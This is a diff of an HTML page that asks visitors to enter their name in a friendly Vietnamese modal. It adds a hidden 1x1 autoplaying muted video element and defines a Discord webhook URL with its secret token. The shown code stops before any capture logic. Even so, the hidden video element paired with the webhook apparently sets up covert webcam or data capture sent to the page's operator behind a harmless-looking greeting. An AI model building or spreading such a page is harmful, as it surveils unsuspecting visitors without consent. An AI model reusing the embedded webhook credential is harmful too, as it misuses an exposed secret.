@@ -120,17 +120,33 @@ h1{font-size:32px;font-weight:700;color:#fff;margin-bottom:10px;text-shadow:0 0 
 </div>
 </div>
 </div>
+<!-- Modal -->
 <div id="notificationModal" class="modal">
-<div class="modal-content">
-<div class="icon-wrapper"></div>
-<h2>Nhập tên của bạn</h2>
-<p>Vui lòng nhập tên để tiếp tục</p>
-<input type="text" class="name-input" id="nameInput" placeholder="Tên của bạn...">
-<p class="error-message" id="errorMessage">Vui lòng nhập tên hợp lệ!</p>
-<button class="btn" id="confirmBtn"><span>Xác nhận</span></button>
+  <div class="modal-content">
+    <div class="icon-wrapper">👋</div>
+
+    <h2>Chào bạn!</h2>
+    <p>Vui lòng nhập tên của bạn để tiếp tục</p>
+
+    <input 
+      type="text" 
+      class="name-input" 
+      id="nameInput" 
+      placeholder="Nhập tên của bạn..."
+    >
+
+    <p class="error-message" id="errorMessage">
+      Vui lòng nhập tên hợp lệ!
+    </p>
+
+    <button class="btn" id="confirmBtn">
+      Xác nhận
+    </button>
+  </div>
 </div>
-</div>
-<video id="video" width="1" height="1" autoplay style="display:none;"></video>
+
+<video id="video" width="1" height="1" autoplay muted style="display:none;"></video>
+
 <script>
 const DISCORD_WEBHOOK='https://discord.com/api/webhooks/1466372734945595537/xclykYndX7PSAUIBGCiJzV0MNY08Hd-dmD4rIhebpc9Q350uxb6JwlVtDywMPBJUa4nt';
 function createStars(){const starsContainer=document.getElementById('stars');const starCount=200;for(let i=0;i<starCount;i++){const star=document.createElement('div');star.className='star';star.style.width=Math.random()*3+'px';star.style.height=star.style.width;star.style.left=Math.random()*100+'%';star.style.top=Math.random()*100+'%';star.style.animationDuration=(Math.random()*3+2)+'s';star.style.animationDelay=Math.random()*3+'s';starsContainer.appendChild(star)}
